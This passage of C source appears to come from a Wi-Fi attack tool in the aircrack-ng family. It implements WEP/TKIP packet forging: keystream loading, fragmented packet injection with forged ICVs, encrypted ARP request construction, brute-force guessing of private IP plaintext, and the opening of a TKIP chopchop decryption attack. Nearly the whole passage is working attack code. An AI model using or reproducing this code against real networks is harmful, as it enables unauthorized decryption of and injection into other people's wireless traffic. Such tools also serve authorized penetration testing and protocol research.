                if( n < 8 || n >= (int) *caplen )
                    continue;

                memcpy( tmpbuf, h80211, *caplen );
                *caplen -= n;
                memcpy( h80211, tmpbuf + n, *caplen );
            }

            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )
            {
                /* remove the radiotap header */

                n = *(unsigned short *)( h80211 + 2 );

                if( n <= 0 || n >= (int) *caplen )
                    continue;

                memcpy( tmpbuf, h80211, *caplen );
                *caplen -= n;
                memcpy( h80211, tmpbuf + n, *caplen );
            }

            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )
            {
                /* remove the PPI header */

                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));

                if( n <= 0 || n>= (int) *caplen )
                    continue;

                /* for a while Kismet logged broken PPI headers */
                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )
                    n = 32;

                if( n <= 0 || n>= (int) *caplen )
                    continue;

                memcpy( tmpbuf, h80211, *caplen );
                *caplen -= n;
                memcpy( h80211, tmpbuf + n, *caplen );
            }
        }

        nb_pkt_read++;

        if( filter_packet( h80211, *caplen ) != 0 )
            continue;

        if(opt.fast)
            break;

        z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
        if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
            z+=2;

        switch( h80211[1] & 3 )
        {
            case  0: mi_b = 16; mi_s = 10; mi_d =  4; is_wds = 0; break;
            case  1: mi_b =  4; mi_s = 10; mi_d = 16; is_wds = 0; break;
            case  2: mi_b = 10; mi_s = 16; mi_d =  4; is_wds = 0; break;
            case  3: mi_t = 10; mi_r =  4; mi_d = 16; mi_s = 24; is_wds = 1; break;  // WDS packet
        }

        printf( "\n\n        Size: %d, FromDS: %d, ToDS: %d",
                *caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );

        if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )
        {
//             if (is_wds) key_index_offset = 33; // WDS packets have an additional MAC, so the key index is at byte 33
//             else key_index_offset = 27;
            key_index_offset = z+3;

            if( ( h80211[key_index_offset] & 0x20 ) == 0 )
                printf( " (WEP)" );
            else
                printf( " (WPA)" );
        }

        printf( "\n\n" );

        if (is_wds) {
            printf( "        Transmitter  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                    h80211[mi_t    ], h80211[mi_t + 1],
                    h80211[mi_t + 2], h80211[mi_t + 3],
                    h80211[mi_t + 4], h80211[mi_t + 5] );

            printf( "           Receiver  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                    h80211[mi_r    ], h80211[mi_r + 1],
                    h80211[mi_r + 2], h80211[mi_r + 3],
                    h80211[mi_r + 4], h80211[mi_r + 5] );
        } else {
            printf( "              BSSID  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                    h80211[mi_b    ], h80211[mi_b + 1],
                    h80211[mi_b + 2], h80211[mi_b + 3],
                    h80211[mi_b + 4], h80211[mi_b + 5] );
        }

        printf( "          Dest. MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                h80211[mi_d    ], h80211[mi_d + 1],
                h80211[mi_d + 2], h80211[mi_d + 3],
                h80211[mi_d + 4], h80211[mi_d + 5] );

        printf( "         Source MAC  =  %02X:%02X:%02X:%02X:%02X:%02X\n",
                h80211[mi_s    ], h80211[mi_s + 1],
                h80211[mi_s + 2], h80211[mi_s + 3],
                h80211[mi_s + 4], h80211[mi_s + 5] );

        /* print a hex dump of the packet */

        for( i = 0; i < *caplen; i++ )
        {
            if( ( i & 15 ) == 0 )
            {
                if( i == 224 )
                {
                    printf( "\n        --- CUT ---" );
                    break;
                }

                printf( "\n        0x%04x:  ", i );
            }

            printf( "%02x", h80211[i] );

            if( ( i & 1 ) != 0 )
                printf( " " );

            if( i == *caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )
            {
                for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )
                {
                    printf( "  " );
                    if( ( j & 1 ) != 0 )
                        printf( " " );
                }

                printf( " " );

                for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )
                    printf( "%c", ( h80211[i - 15 + j] <  32 ||
                                    h80211[i - 15 + j] > 126 )
                                  ? '.' : h80211[i - 15 + j] );
            }

            if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )
            {
                printf( " " );

                for( j = 0; j < 16; j++ )
                    printf( "%c", ( h80211[i - 15 + j] <  32 ||
                                    h80211[i - 15 + j] > 127 )
                                  ? '.' : h80211[i - 15 + j] );
            }
        }

        printf( "\n\nUse this packet ? " );
        fflush( stdout );
        ret=0;
        while(!ret) ret = scanf( "%s", tmpbuf );
        printf( "\n" );

        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )
            break;
    }

    if(!just_grab)
    {
        pfh_out.magic         = TCPDUMP_MAGIC;
        pfh_out.version_major = PCAP_VERSION_MAJOR;
        pfh_out.version_minor = PCAP_VERSION_MINOR;
        pfh_out.thiszone      = 0;
        pfh_out.sigfigs       = 0;
        pfh_out.snaplen       = 65535;
        pfh_out.linktype      = LINKTYPE_IEEE802_11;

        lt = localtime( (const time_t *) &tv.tv_sec );

        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                "replay_src-%02d%02d-%02d%02d%02d.cap",
                lt->tm_mon + 1, lt->tm_mday,
                lt->tm_hour, lt->tm_min, lt->tm_sec );

        printf( "Saving chosen packet in %s\n", strbuf );

        if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
        {
            perror( "fopen failed" );
            return( 1 );
        }

        n = sizeof( struct pcap_file_header );

        if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
        {
        	fclose(f_cap_out);
            perror( "fwrite failed\n" );
            return( 1 );
        }

        pkh.tv_sec  = tv.tv_sec;
        pkh.tv_usec = tv.tv_usec;
        pkh.caplen  = *caplen;
        pkh.len     = *caplen;

        n = sizeof( pkh );

        if( fwrite( &pkh, n, 1, f_cap_out ) != 1 )
        {
        	fclose(f_cap_out);
            perror( "fwrite failed" );
            return( 1 );
        }

        n = pkh.caplen;

        if( fwrite( h80211, n, 1, f_cap_out ) != 1 )
        {
        	fclose(f_cap_out);
            perror( "fwrite failed" );
            return( 1 );
        }

        fclose( f_cap_out );
    }

    return( 0 );
}

int read_prga(unsigned char **dest, char *file)
{
    FILE *f;
    int size;

    if(file == NULL) return( 1 );
    if(*dest == NULL) *dest = (unsigned char*) malloc(1501);

    f = fopen(file, "r");

    if(f == NULL)
    {
         printf("Error opening %s\n", file);
         return( 1 );
    }

    fseek(f, 0, SEEK_END);
    size = ftell(f);
    rewind(f);

    if(size > 1500) size = 1500;

    if( fread( (*dest), size, 1, f ) != 1 )
    {
    	fclose(f);
        fprintf( stderr, "fread failed\n" );
        return( 1 );
    }

    opt.prgalen = size;

    fclose(f);
    return( 0 );
}

void add_icv(unsigned char *input, int len, int offset)
{
    unsigned long crc = 0xFFFFFFFF;
    int n=0;

    for( n = offset; n < len; n++ )
        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);

    crc = ~crc;

    input[len]   = (crc      ) & 0xFF;
    input[len+1] = (crc >>  8) & 0xFF;
    input[len+2] = (crc >> 16) & 0xFF;
    input[len+3] = (crc >> 24) & 0xFF;

    return;
}

void send_fragments(unsigned char *packet, int packet_len, unsigned char *iv, unsigned char *keystream, int fragsize, int ska)
{
    int t, u;
    int data_size;
    unsigned char frag[32+fragsize];
    int pack_size;
    int header_size=24;

    data_size = packet_len-header_size;
    packet[23] = (rand() % 0xFF);

    for (t=0; t+=fragsize;)
    {

    //Copy header
        memcpy(frag, packet, header_size);

    //Copy IV + KeyIndex
        memcpy(frag+header_size, iv, 4);

    //Copy data
        if(fragsize <= packet_len-(header_size+t-fragsize))
            memcpy(frag+header_size+4, packet+header_size+t-fragsize, fragsize);
        else
            memcpy(frag+header_size+4, packet+header_size+t-fragsize, packet_len-(header_size+t-fragsize));

    //Make ToDS frame
        if(!ska)
        {
            frag[1] |= 1;
            frag[1] &= 253;
        }

    //Set fragment bit
        if (t< data_size) frag[1] |= 4;
        if (t>=data_size) frag[1] &= 251;

    //Fragment number
        frag[22] = 0;
        for (u=t; u-=fragsize;)
        {
            frag[22] += 1;
        }
//        frag[23] = 0;

    //Calculate packet length
        if(fragsize <= packet_len-(header_size+t-fragsize))
            pack_size = header_size + 4 + fragsize;
        else
            pack_size = header_size + 4 + (packet_len-(header_size+t-fragsize));

    //Add ICV
        add_icv(frag, pack_size, header_size + 4);
        pack_size += 4;

    //Encrypt
        xor_keystream(frag + header_size + 4, keystream, fragsize+4);

    //Send
        send_packet(frag, pack_size);
        if (t<data_size)usleep(100);

        if (t>=data_size) break;
    }

}

int set_clear_arp(unsigned char *buf, unsigned char *smac, unsigned char *dmac) //set first 22 bytes
{
    if(buf == NULL)
        return -1;

    memcpy(buf, S_LLC_SNAP_ARP, 8);
    buf[8]  = 0x00;
    buf[9]  = 0x01; //ethernet
    buf[10] = 0x08; // IP
    buf[11] = 0x00;
    buf[12] = 0x06; //hardware size
    buf[13] = 0x04; //protocol size
    buf[14] = 0x00;
    if(memcmp(dmac, BROADCAST, 6) == 0)
        buf[15]  = 0x01; //request
    else
        buf[15]  = 0x02; //reply
    memcpy(buf+16, smac, 6);

    return 0;
}

int build_arp_request(unsigned char* packet, int *length, int toDS)
{
    int i;
    unsigned char buf[128];

    packet[0] = 0x88; //QoS Data
    if(toDS) packet[1] = 0x41;  //encrypted to/fromDS
    else     packet[1] = 0x42;
    packet[2] = 0x2c;
    packet[3] = 0x00;
    if(toDS)
    {
        memcpy(packet+4,  opt.f_bssid, 6);
        memcpy(packet+10, opt.r_smac, 6);
        memcpy(packet+16, opt.r_apmac, 6);
    }
    else
    {
        memcpy(packet+4,  opt.r_smac, 6);
        memcpy(packet+10, opt.f_bssid, 6);
        memcpy(packet+16, opt.r_apmac, 6);
    }

    packet[22] = 0xD0;  //fragment 0
    packet[23] = 0xB4;
    if(toDS)
        packet[24] = 0x01;  //priority 1
    else
        packet[24] = 0x02;  //priority 2
    packet[25] = 0x00;

    if(toDS)
        set_clear_arp(packet+26, opt.r_smac, BROADCAST);
    else
        set_clear_arp(packet+26, opt.r_apmac, BROADCAST);

    if(toDS)
        memcpy(packet+26+22, opt.ip_cli, 4);
    else
        memcpy(packet+26+22, opt.ip_ap, 4);

    memcpy(packet+26+26, BROADCAST, 6);

    if(toDS)
        memcpy(packet+26+32, opt.ip_ap, 4);
    else
        memcpy(packet+26+32, opt.ip_cli, 4);

    *length = 26+36;

    calc_tkip_mic(packet, *length, opt.ptk, packet+(*length));

    *length += 8;

    memcpy(buf, packet+26, (*length) - 26);
    memcpy(packet+26+8, buf, (*length) - 26);

    if(toDS)
        memcpy(packet+26, opt.chopped_to_prga, 8);      //set IV&extIV for a toDS frame
    else
        memcpy(packet+26, opt.chopped_from_prga, 8);    //set IV&extIV for a fromDS frame

    (*length)+=8;

    add_icv(packet, *length, 26+8);

    (*length) += 4;

    if(toDS)
    {
        if(opt.chopped_to_prga_len-8 < *length - 26-8)
            return 1;

        for(i=0; i<*length-26-8; i++)
            packet[26+8+i] ^= opt.chopped_to_prga[8+i];
    }
    else
    {
        if(opt.chopped_from_prga_len-8 < *length - 26-8)
            return 1;

        for(i=0; i<*length-26-8; i++)
            packet[26+8+i] ^= opt.chopped_from_prga[8+i];
    }
    return 0;
}

int set_clear_ip(unsigned char *buf, int ip_len) //set first 9 bytes
{
    if(buf == NULL)
        return -1;

    memcpy(buf, S_LLC_SNAP_IP, 8);
    buf[8]  = 0x45;
    buf[10] = (ip_len >> 8)  & 0xFF;
    buf[11] = ip_len & 0xFF;

    return 0;
}

void dump_packet(unsigned char* packet, int len)
{
    int i=0;

    for(i=0; i<len; i++)
    {
        if(i>0 && i%4 == 0)printf(" ");
        if(i>0 && i%16 == 0)printf("\n");
        printf("%02X ", packet[i]);
    }
    printf("\n\n");
}

int check_guess(unsigned char *srcbuf, unsigned char *chopped, int caplen, int clearlen, unsigned char *arp, unsigned char *dmac)
{
    int i, j, z, pos;

    z = ( ( srcbuf[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( srcbuf[0] & 0x80 ) == 0x80 ) /* QoS */
        z+=2;

//     if(arp[22] == 192 && arp[23] == 168 && arp[24] == 178 && arp[25] == 1)
//     {
//         printf("Source: %i.%i.%i.%i; Dest: %i.%i.%i.%i\n",
//                 arp[22], arp[23], arp[24], arp[25], arp[32], arp[33], arp[34], arp[35] );
//     }

    pos = caplen-z-8-clearlen;
    for(i=0; i<clearlen; i++)
    {
        arp[pos+i] = srcbuf[z+8+pos+i] ^ chopped[z+8+pos+i];
    }
    for(j=1; j<3; j++)
    {
        arp[15] = j;

        memcpy(arp+26, ZERO, 6);
        if (check_crc_buf( arp, caplen-z-8-4) == 1)
        {
            for(i=0; i<pos; i++)
            {
                chopped[z+8+i] = srcbuf[z+8+i] ^ arp[i];
            }
            return 1;
        }

        memcpy(arp+26, BROADCAST, 6);
        if (check_crc_buf( arp, caplen-z-8-4) == 1)
        {
            for(i=0; i<pos; i++)
            {
                chopped[z+8+i] = srcbuf[z+8+i] ^ arp[i];
            }
            return 1;
        }

        memcpy(arp+26, dmac, 6);
        if (check_crc_buf( arp, caplen-z-8-4) == 1)
        {
            for(i=0; i<pos; i++)
            {
                chopped[z+8+i] = srcbuf[z+8+i] ^ arp[i];
            }
            return 1;
        }
    }
    return 0;
}

int guess_packet(unsigned char *srcbuf, unsigned char *chopped, int caplen, int clearlen)
{
    int i,j,k,l,z, len;
    unsigned char smac[6], dmac[6], bssid[6];

    unsigned char *ptr, *psmac, *psip, *pdmac, *pdip;
    unsigned char arp[4096];

    z = ( ( srcbuf[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( srcbuf[0] & 0x80 ) == 0x80 ) /* QoS */
        z+=2;

    if(caplen-z-8 - clearlen > 36)  //too many unknown bytes
        return 1;

    printf("%i bytes still unknown\n", caplen-z-8 - clearlen);

    switch( srcbuf[1] & 3 )
    {
        case  0:
            memcpy( bssid, srcbuf + 16, 6 );
            memcpy( dmac, srcbuf + 4, 6 );
            memcpy( smac, srcbuf + 10, 6 );
            break;
        case  1:
            memcpy( bssid, srcbuf + 4, 6 );
            memcpy( dmac, srcbuf + 16, 6 );
            memcpy( smac, srcbuf + 10, 6 );
            break;
        case  2:
            memcpy( bssid, srcbuf + 10, 6 );
            memcpy( dmac, srcbuf + 4, 6 );
            memcpy( smac, srcbuf + 16, 6 );
            break;
        default:
            memcpy( bssid, srcbuf + 10, 6 );
            memcpy( dmac, srcbuf + 16, 6 );
            memcpy( smac, srcbuf + 24, 6 );
            break;
    }

    ptr = arp;
    psmac = arp+16;
    pdmac = arp+26;
    psip  = arp+22;
    pdip  = arp+32;

    len = sizeof(S_LLC_SNAP_ARP) - 1;
    memcpy(ptr, S_LLC_SNAP_ARP, len);
    ptr += len;

    /* arp hdr */
    len = 6;
    memcpy(ptr, "\x00\x01\x08\x00\x06\x04", len);
    ptr += len;

    /* type of arp */
    len = 2;
    if (memcmp(dmac, "\xff\xff\xff\xff\xff\xff", 6) == 0)
            memcpy(ptr, "\x00\x01", len);
    else
            memcpy(ptr, "\x00\x02", len);
    ptr += len;

    /* src mac */
    len = 6;
    memcpy(ptr, smac, len);
    ptr += len;

    /* dmac */
    if (memcmp(dmac, "\xff\xff\xff\xff\xff\xff", 6) != 0)
    {
        printf("ARP Reply\n");
        memcpy(pdmac, dmac, 6);
    }
    else
    {
        printf("ARP Request\n");
        memcpy(pdmac, ZERO, 6);
    }

    if(caplen-z-8 - clearlen == 36)
    {
        printf("Checking 192.168.x.y\n");
        /* check 192.168.i.1-254 */
        for(i=0; i<256; i++)
        {
            for(j=1; j<255; j++)
            {
                for(k=1; k<255; k++)
                {
                    psip[0] = 192;
                    psip[1] = 168;
                    psip[2] = i;
                    psip[3] = j;

                    pdip[0] = 192;
                    pdip[1] = 168;
                    pdip[2] = i;
                    pdip[3] = k;

                    if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                        return 0;
                }
            }
        }

        printf("Checking 10.0.y.z\n");
        /* check 10.i.j.1-254 */
        for(j=0; j<256; j++)
        {
            for(k=1; k<255; k++)
            {
                for(l=1; l<255; l++)
                {
                    psip[0] = 10;
                    psip[1] = 0;
                    psip[2] = j;
                    psip[3] = k;

                    pdip[0] = 10;
                    pdip[1] = 0;
                    pdip[2] = j;
                    pdip[3] = l;

                    if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                        return 0;
                }
            }
        }

        printf("Checking 172.16.y.z\n");
        /* check 172.16-31.j.1-254 */
        for(j=1; j<255; j++)
        {
            for(k=1; k<255; k++)
            {
                for(l=1; l<255; l++)
                {
                    psip[0] = 172;
                    psip[1] = 16;
                    psip[2] = j;
                    psip[3] = k;

                    pdip[0] = 172;
                    pdip[1] = 16;
                    pdip[2] = j;
                    pdip[3] = l;

                    if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                        return 0;
                }
            }
        }
    }

    if(caplen-z-8 - clearlen == 35)
    {
        printf("Checking 192.168.x.y\n");
        /* check 192.168.i.1-254 */
        for(i=0; i<256; i++)
        {
            for(j=1; j<255; j++)
            {
                psip[0] = 192;
                psip[1] = 168;
                psip[2] = i;
                psip[3] = j;

                pdip[0] = 192;
                pdip[1] = 168;
                pdip[2] = i;

                if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                    return 0;
            }
        }

        printf("Checking 10.0.y.z\n");
        /* check 10.i.j.1-254 */
        for(i=0; i<256; i++)
        {
            for(j=0; j<256; j++)
            {
                for(k=1; k<255; k++)
                {
                    psip[0] = 10;
                    psip[1] = i;
                    psip[2] = j;
                    psip[3] = k;

                    pdip[0] = 10;
                    pdip[1] = i;
                    pdip[2] = j;

                    if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                        return 0;
                }
            }
        }

        printf("Checking 172.16-31.y.z\n");
        /* check 172.16-31.j.1-254 */
        for(i=16; i<32; i++)
        {
            for(j=0; j<256; j++)
            {
                for(k=1; k<255; k++)
                {
                    psip[0] = 172;
                    psip[1] = i;
                    psip[2] = j;
                    psip[3] = k;

                    pdip[0] = 172;
                    pdip[1] = i;
                    pdip[2] = j;

                    if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                        return 0;
                }
            }
        }
    }

    if(caplen-z-8 - clearlen == 34)
    {
        printf("Checking 192.168.x.y\n");
        /* check 192.168.i.1-254 */
        for(i=0; i<256; i++)
        {
            for(j=1; j<255; j++)
            {
                psip[0] = 192;
                psip[1] = 168;
                psip[2] = i;
                psip[3] = j;

                pdip[0] = 192;
                pdip[1] = 168;

                if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                    return 0;
            }
        }

        printf("Checking 10.x.y.z\n");
        /* check 10.i.j.1-254 */
        for(i=0; i<256; i++)
        {
            for(j=0; j<256; j++)
            {
                for(k=1; k<255; k++)
                {
                    psip[0] = 10;
                    psip[1] = i;
                    psip[2] = j;
                    psip[3] = k;

                    pdip[0] = 10;
                    pdip[1] = i;

                    if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                        return 0;
                }
            }
        }

        printf("Checking 172.16-31.y.z\n");
        /* check 172.16-31.j.1-254 */
        for(i=16; i<32; i++)
        {
            for(j=0; j<256; j++)
            {
                for(k=1; k<255; k++)
                {
                    psip[0] = 172;
                    psip[1] = i;
                    psip[2] = j;
                    psip[3] = k;

                    pdip[0] = 172;
                    pdip[1] = i;

                    if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                        return 0;
                }
            }
        }
    }

    if(caplen-z-8 - clearlen <= 33 && caplen-z-8 - clearlen >= 26)
    {
        printf("Checking 192.168.x.y\n");
        /* check 192.168.i.1-254 */
        if( (srcbuf[z+8+33]^chopped[z+8+33]) == 168)
        {
            for(i=0; i<256; i++)
            {
                for(j=1; j<255; j++)
                {
                    psip[0] = 192;
                    psip[1] = 168;
                    psip[2] = i;
                    psip[3] = j;

                    pdip[0] = 192;

                    if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                        return 0;
                }
            }
        }

        if( (srcbuf[z+8+33]^chopped[z+8+33]) >= 16 && (srcbuf[z+8+33]^chopped[z+8+33]) < 32)
        {
            printf("Checking 172.16-31.y.z\n");
            /* check 172.16-31.j.1-254 */
            for(i=16; i<32; i++)
            {
                for(j=0; j<256; j++)
                {
                    for(k=1; k<255; k++)
                    {
                        psip[0] = 172;
                        psip[1] = i;
                        psip[2] = j;
                        psip[3] = k;

                        pdip[0] = 172;

                        if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                            return 0;
                    }
                }
            }
        }

        printf("Checking 10.x.y.z\n");
        /* check 10.i.j.1-254 */
        for(i=0; i<256; i++)
        {
            for(j=0; j<256; j++)
            {
                for(k=1; k<255; k++)
                {
                    psip[0] = 10;
                    psip[1] = i;
                    psip[2] = j;
                    psip[3] = k;

                    pdip[0] = 10;

                    if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                        return 0;
                }
            }
        }
    }

    if(caplen-z-8 - clearlen == 25)
    {
        printf("Checking 192.168.x.y\n");
        /* check 192.168.i.1-254 */
        if( (srcbuf[z+8+32]^chopped[z+8+32]) == 192 && (srcbuf[z+8+33]^chopped[z+8+33]) == 168)
        {
            for(i=0; i<256; i++)
            {
                psip[0] = 192;
                psip[1] = 168;
                psip[2] = i;

                if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                    return 0;
            }
        }

        if( (srcbuf[z+8+32]^chopped[z+8+32]) == 172 && (srcbuf[z+8+33]^chopped[z+8+33]) >= 16 && (srcbuf[z+8+33]^chopped[z+8+33]) < 32)
        {
            printf("Checking 172.16-31.y.z\n");
            /* check 172.16-31.j.1-254 */
            for(i=16; i<32; i++)
            {
                for(j=0; j<256; j++)
                {
                    psip[0] = 172;
                    psip[1] = i;
                    psip[2] = j;

                    if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                        return 0;
                }
            }
        }

        printf("Checking 10.x.y.z\n");
        /* check 10.i.j.1-254 */
        for(i=0; i<256; i++)
        {
            for(j=0; j<256; j++)
            {
                psip[0] = 10;
                psip[1] = i;
                psip[2] = j;

                if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                    return 0;
            }
        }
    }

    if(caplen-z-8 - clearlen == 24)
    {
        printf("Checking 192.168.x.y\n");
        /* check 192.168.i.1-254 */
        if( (srcbuf[z+8+32]^chopped[z+8+32]) == 192 && (srcbuf[z+8+33]^chopped[z+8+33]) == 168)
        {
            psip[0] = 192;
            psip[1] = 168;

            if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                return 0;
        }

        if( (srcbuf[z+8+32]^chopped[z+8+32]) == 172 && (srcbuf[z+8+33]^chopped[z+8+33]) >= 16 && (srcbuf[z+8+33]^chopped[z+8+33]) < 32)
        {
            printf("Checking 172.16-31.y.z\n");
            /* check 172.16-31.j.1-254 */
            for(i=16; i<32; i++)
            {
                psip[0] = 172;
                psip[1] = i;

                if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                    return 0;
            }
        }

        printf("Checking 10.x.y.z\n");
        /* check 10.i.j.1-254 */
        for(i=0; i<256; i++)
        {
            psip[0] = 10;
            psip[1] = i;

            if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                return 0;
        }
    }

    if(caplen-z-8 - clearlen <= 23)
    {
        printf("Checking 192.168.x.y\n");
        /* check 192.168.i.1-254 */
        if( (srcbuf[z+8+32]^chopped[z+8+32]) == 192 && (srcbuf[z+8+33]^chopped[z+8+33]) == 168)
        {
            psip[0] = 192;

            if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                return 0;
        }

        if( (srcbuf[z+8+32]^chopped[z+8+32]) == 172 && (srcbuf[z+8+33]^chopped[z+8+33]) >= 16 && (srcbuf[z+8+33]^chopped[z+8+33]) < 32)
        {
            printf("Checking 172.16-31.y.z\n");
            /* check 172.16-31.j.1-254 */
            psip[0] = 172;

            if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                return 0;
        }

        printf("Checking 10.x.y.z\n");
        /* check 10.i.j.1-254 */
        psip[0] = 10;

        if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
            return 0;
    }

    if(caplen-z-8 - clearlen <= 32)
    {
        for(i=0; i<256; i++)
        {
            for(j=1; j<255; j++)
            {
                psip[0] = srcbuf[z+8+32]^chopped[z+8+32];
                psip[1] = srcbuf[z+8+33]^chopped[z+8+33];
                psip[2] = i;
                psip[3] = j;

                if( check_guess(srcbuf, chopped, caplen, clearlen, arp, dmac) ) //got correct guess
                    return 0;
            }
        }
    }
    return 1;
}

int do_attack_tkipchop( unsigned char* src_packet, int src_packet_len )
{
    float f, ticks[4];
    int i, j, n, z, caplen, srcz, srclen;
    int data_start, data_end, srcdiff, diff;
    int guess, is_deauth_mode;
    int nb_bad_pkt;
    int tried_header_rec=0;
    int tries=0;
    int keystream_len=0;
    int settle=0;

    unsigned char b1 = 0xAA;
    unsigned char b2 = 0xAA;

    unsigned char mic[8];
    unsigned char smac[6], dmac[6], bssid[6];
    unsigned char rc4key[16], keystream[4096];

    FILE *f_cap_out;
    long nb_pkt_read;
    unsigned long crc_mask;
    unsigned char *chopped;

    unsigned char packet[4096];

    time_t tt;
    struct tm *lt;
    struct timeval tv;
    struct timeval tv2;
    struct timeval mic_fail;
    struct pcap_file_header pfh_out;
    struct pcap_pkthdr pkh;

    srand( time( NULL ) );

    memcpy( h80211, src_packet, src_packet_len);
    caplen = src_packet_len;
    if( (h80211[1] & 3) == 1)
    {
        h80211[1] += 1;

        memcpy( bssid, srcbuf + 4, 6 );
        memcpy( dmac, srcbuf + 16, 6 );
        memcpy( smac, srcbuf + 10, 6 );

        memcpy( srcbuf + 10, bssid, 6 );
        memcpy( srcbuf + 4, dmac, 6 );
        memcpy( srcbuf + 16, smac, 6 );
//         memcpy(h80211+16, BROADCAST, 6);
    }


    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
        z+=2;
    srcz = z;

    if( (unsigned)caplen > sizeof(srcbuf) || (unsigned)caplen > sizeof(h80211) )
        return( 1 );

//     if( opt.r_smac_set == 1 )
//     {
//         //handle picky APs (send one valid packet before all the invalid ones)
//         memset(packet, 0, sizeof(packet));
//
//         memcpy( packet, NULL_DATA, 24 );
//         memcpy( packet +  4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6 );
//         memcpy( packet + 10, opt.r_smac,  6 );
//         memcpy( packet + 16, opt.f_bssid, 6 );
//
//         packet[0] = 0x08; //make it a data packet
//         packet[1] = 0x41; //set encryption and ToDS=1
//
//         memcpy( packet+24, h80211+z, caplen-z);
//
//         if( send_packet( packet, caplen-z+24 ) != 0 )
//             return( 1 );
//         //done sending a correct packet
//     }

    /* Special handling for spanning-tree packets */
    if ( memcmp( h80211 +  4, SPANTREE, 6 ) == 0 ||
        memcmp( h80211 + 16, SPANTREE, 6 ) == 0 )
    {
        b1 = 0x42; b2 = 0x42;
    }

    printf( "\n" );

    /* chopchop operation mode: truncate and decrypt the packet */
    /* we assume the plaintext starts with  AA AA 03 00 00 00   */
    /* (42 42 03 00 00 00 for spanning-tree packets)            */

    memcpy( srcbuf, h80211, caplen );

    /* debug: generate the keystream */
    if(opt.got_ptk)
    {
        calc_tkip_ppk( srcbuf, caplen, opt.wpa_sta.ptk+32, rc4key );
        PCT; printf("Per Packet Key: ");
        for(i=0; i<15; i++)
            printf("%02X:", rc4key[i]);
        printf("%02X\n", rc4key[15]);

        memset(keystream, 0, 4096);

        keystream_len = caplen - z - 8;
        encrypt_wep(keystream, keystream_len, rc4key, 16);

        PCT; printf("Keystream length: %i, Keystream:\n", keystream_len);
        for(i=0; i<keystream_len-1; i++)
            printf("%02X:", keystream[i]);
        printf("%02X\n", keystream[keystream_len-1]);

        memcpy(packet, srcbuf, caplen);
        PCT; printf("Decrypt: %i\n", decrypt_wep(packet+z+8, caplen-z-8, rc4key, 16));
        PCT; printf("Keystream 2:\n");
        for(i=0; i<keystream_len-1; i++)
            printf("%02X:", packet[z+8+i]^srcbuf[z+8+i]);
        printf("%02X\n", packet[z+8+keystream_len-1]^srcbuf[z+8+keystream_len-1]);

//         opt.oldkeystreamlen = keystream_len-(47-z-8);
        opt.oldkeystreamlen = keystream_len-37;
        for(i=0; i<opt.oldkeystreamlen; i++)
            opt.oldkeystream[i] = keystream[keystream_len-1 - i];

    }

    /* setup the chopping buffer */

    n = caplen;

    switch( srcbuf[1] & 3 )
    {
        case  0:
            memcpy( bssid, srcbuf + 16, 6 );
            memcpy( dmac, srcbuf + 4, 6 );
            memcpy( smac, srcbuf + 10, 6 );
            break;
        case  1:
            memcpy( bssid, srcbuf + 4, 6 );
            memcpy( dmac, srcbuf + 16, 6 );
            memcpy( smac, srcbuf + 10, 6 );
            break;
        case  2:
            memcpy( bssid, srcbuf + 10, 6 );
            memcpy( dmac, srcbuf + 4, 6 );
            memcpy( smac, srcbuf + 16, 6 );
            break;
        default:
            memcpy( bssid, srcbuf + 10, 6 );
            memcpy( dmac, srcbuf + 16, 6 );
